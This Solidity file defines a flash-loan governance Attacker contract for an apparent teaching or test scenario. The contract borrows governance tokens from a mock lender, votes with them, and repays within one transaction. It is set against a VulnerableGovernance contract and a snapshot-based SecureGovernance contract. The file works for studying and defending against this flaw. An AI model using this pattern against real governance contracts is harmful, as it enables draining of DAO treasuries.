// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import {IFlashLoanReceiver, MockLender} from "../../common/MockLender.sol";
import {IGovernance} from "./IGovernance.sol";

/**
 * @title Attacker
 * @notice Flash-loan governance attacker for scenario S5.
 * @dev Borrows the governance token from {MockLender}, votes with it while the
 *      loan is outstanding, and repays — all inside one transaction. Against
 *      {VulnerableGovernance} the borrowed balance is counted as voting power,
 *      so the attacker single-handedly reaches quorum and can later drain the
 *      treasury. Against {SecureGovernance} the vote weight is read from the
 *      proposal snapshot, where the attacker held nothing, so the vote is
 *      worthless and the proposal fails.
 */
contract Attacker is IFlashLoanReceiver {
    using SafeERC20 for IERC20;

    /// @notice Fee-less flash-loan provider of the governance token.
    MockLender public immutable lender;

    /// @notice Governance contract being attacked.
    IGovernance public immutable governance;

    /// @notice Governance token, lent by {lender}.
    IERC20 public immutable token;

    /// @notice Proposal the last {attack} voted on.
    uint256 public proposalId;

    /// @notice Whether the flash-loan callback has run.
    bool public voted;

    error ZeroAddress();
    error NotLender();

    /**
     * @param target  governance contract to attack
     * @param lender_ flash-loan provider to borrow from
     */
    constructor(address target, address lender_) {
        if (target == address(0) || lender_ == address(0)) {
            revert ZeroAddress();
        }
        governance = IGovernance(target);
        lender = MockLender(lender_);
        token = lender.lendingToken();
    }

    /**
     * @notice Vote on the most recent proposal using flash-loaned tokens.
     * @dev Borrows the lender's entire liquidity, votes, and repays in the
     *      callback.
     */
    function attack() external {
        proposalId = governance.proposalCount();
        lender.flashLoan(lender.maxFlashLoan(), abi.encode(proposalId));
    }

    /// @inheritdoc IFlashLoanReceiver
    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata data) external {
        if (msg.sender != address(lender)) {
            revert NotLender();
        }

        uint256 id = abi.decode(data, (uint256));
        governance.castVote(id, true);
        voted = true;

        // Repay the principal so the lender is made whole again.
        token.safeTransfer(address(lender), amount);
    }

    /**
     * @notice Governance tokens the attacker has extracted from the treasury.
     */
    function profit() external view returns (uint256) {
        return token.balanceOf(address(this));
    }
}
